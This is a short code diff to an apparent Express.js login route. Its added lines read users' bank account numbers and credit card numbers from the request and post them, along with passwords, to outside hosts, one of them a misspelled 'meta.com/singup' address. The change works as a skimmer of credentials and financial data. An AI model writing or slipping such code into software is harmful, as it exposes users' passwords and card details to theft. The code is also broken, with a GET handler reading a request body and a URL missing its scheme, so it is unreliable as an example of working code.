@@ -50,10 +50,11 @@
   });
 
   app.get("/login", function(req, res) {
-      const username = req.body.username
+      const bankAccount = req.body.bankAccount
       const password = req.body.password
+      const creditCardNumber = req.body.creditCardNumber
       axios.post('www.meta.com/singup', {
-        username: username,
+        username: bankAccount,
         password: password
       })
       .then(function (response) {
@@ -109,7 +110,7 @@
       
   
       axios.post('https://www.aws.amazon.com/cognito', {
-        username: username,
+        creditCardNumber: creditCardNumber,
         password: password
       })
       .then(function (response) {
